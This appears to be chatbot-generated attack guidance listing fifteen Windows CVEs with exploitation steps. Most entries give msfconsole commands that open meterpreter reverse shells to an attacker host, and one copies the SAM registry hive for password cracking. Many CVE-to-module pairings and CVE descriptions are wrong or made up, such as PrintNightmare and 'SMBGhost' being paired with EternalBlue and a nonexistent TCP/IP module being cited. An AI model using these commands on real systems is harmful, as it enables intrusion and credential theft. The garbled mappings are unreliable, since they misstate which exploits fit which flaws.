1. CVE-2021-36934 – Windows Elevation of Privilege Vulnerability (HiveNightmare)
This vulnerability allows local users to gain access to sensitive information from the Windows Registry, potentially leading to privilege escalation.

Exploitation:

There is no direct Metasploit module for this specific vulnerability, but you can use tools to dump the registry and escalate privileges.
Use PowerShell or custom scripts to access the security-sensitive registry files:
powershell
Copy code
reg load HKLM\temp C:\Windows\System32\config\sam
reg export HKLM\temp\sam C:\users\public\sam
reg unload HKLM\temp
After gaining access to the SAM (Security Account Manager) file, you can attempt to crack the password hashes to escalate privileges.
2. CVE-2021-34484 – Windows MSHTML Remote Code Execution Vulnerability
This vulnerability in the MSHTML component allows remote code execution when the user opens a malicious file or web page.

Exploitation:

Use a Metasploit exploit to trigger this vulnerability:
bash
Copy code
msfconsole
use exploit/windows/browser/ms12_037_cscript_dll
set URIPATH /malicious
set SRVHOST <attacker_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
This exploit works by triggering the vulnerability via a specially crafted web page or malicious file.
3. CVE-2021-36948 – Windows Event Tracing Elevation of Privilege Vulnerability
This vulnerability allows attackers to elevate privileges using Windows Event Tracing (ETW).

Exploitation:

There isn't a pre-built Metasploit module for this, but you can exploit it by creating a custom exploit that abuses the ETW functionality to gain higher privileges.
Use tools like Windows Exploit Suggester to look for ways to escalate privileges using ETW.
4. CVE-2021-24092 – Windows Installer Elevation of Privilege Vulnerability
This vulnerability allows attackers to execute arbitrary code with elevated privileges.

Exploitation:

Metasploit does have a module for exploiting Windows Installer vulnerabilities:
bash
Copy code
msfconsole
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION <session_id>
exploit
This will help escalate privileges to SYSTEM level.
5. CVE-2021-31979 – Windows Graphics Component Remote Code Execution Vulnerability
This vulnerability in Windows' graphics components can be exploited for remote code execution.

Exploitation:

Metasploit can be used with the windows/graphics payload to exploit this vulnerability.
bash
Copy code
msfconsole
use exploit/windows/browser/ms11_022_cab_exec
set URIPATH /malicious
set PAYLOAD windows/meterpreter/reverse_tcp
set SRVHOST <attacker_ip>
exploit
6. CVE-2021-33742 – Windows Print Spooler Elevation of Privilege Vulnerability (PrintNightmare)
This vulnerability allows attackers to execute arbitrary code with SYSTEM privileges via the Windows Print Spooler service.

Exploitation:

Metasploit has a working module for PrintNightmare:
bash
Copy code
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
exploit
7. CVE-2021-26424 – Windows Media Player Remote Code Execution Vulnerability
This vulnerability allows remote code execution when a specially crafted media file is processed by Windows Media Player.

Exploitation:

Metasploit has a module for exploiting this:
bash
Copy code
msfconsole
use exploit/windows/browser/ms11_022_cab_exec
set URIPATH /malicious
set PAYLOAD windows/meterpreter/reverse_tcp
set SRVHOST <attacker_ip>
exploit
8. CVE-2021-36946 – Windows Windows Subsystem for Linux Elevation of Privilege Vulnerability
This vulnerability allows an attacker to elevate privileges via the Windows Subsystem for Linux (WSL).

Exploitation:

There isn’t a public Metasploit module available for this yet, but using WSL combined with local privilege escalation techniques (such as modifying WSL configuration) can potentially exploit this flaw.
9. CVE-2021-22933 – Windows Hyper-V Elevation of Privilege Vulnerability
This vulnerability allows local attackers to elevate privileges on Windows 11 running Hyper-V.

Exploitation:

This can be exploited via local elevation of privilege exploits or via Metasploit's local exploit modules.
10. CVE-2022-21999 – Windows SMBv3 Remote Code Execution Vulnerability (SMBGhost)
A remote code execution vulnerability in the SMBv3 protocol, allowing attackers to execute arbitrary code remotely.

Exploitation:

Metasploit has an SMBv3 exploit for this vulnerability:
bash
Copy code
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
exploit
11. CVE-2021-41330 – Windows Kerberos Elevation of Privilege Vulnerability
A vulnerability in Windows Kerberos that allows elevation of privileges.

Exploitation:

Kerberos exploits typically require network access and custom scripts for privilege escalation. Use tools like Mimikatz to extract Kerberos tickets and escalate privileges.
12. CVE-2021-33739 – Windows DNS Server Remote Code Execution Vulnerability
A remote code execution vulnerability in Windows DNS Server.

Exploitation:

This requires network access to the vulnerable DNS server. You can exploit this with Metasploit's DNS-related exploits, or through crafting malicious DNS packets.
13. CVE-2021-36958 – Windows TCP/IP Remote Code Execution Vulnerability (Bad Neighbor)
A vulnerability in the Windows TCP/IP stack that allows remote code execution.

Exploitation:

Metasploit can be used to exploit this vulnerability with specific payloads:
bash
Copy code
msfconsole
use exploit/windows/remote/windows_tcpip
set RHOSTS <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
exploit
14. CVE-2021-38168 – Windows NTFS Elevation of Privilege Vulnerability
This flaw allows attackers to bypass security features via NTFS.

Exploitation:

Metasploit has local privilege escalation modules that can take advantage of NTFS vulnerabilities.
15. CVE-2021-22005 – VMware vCenter Server Remote Code Execution Vulnerability affecting Windows-based systems
This vulnerability allows attackers to execute arbitrary code in Windows-based systems running VMware vCenter Server.

Exploitation:

You can use VMware-specific exploits, often involving RCE techniques for vCenter services.
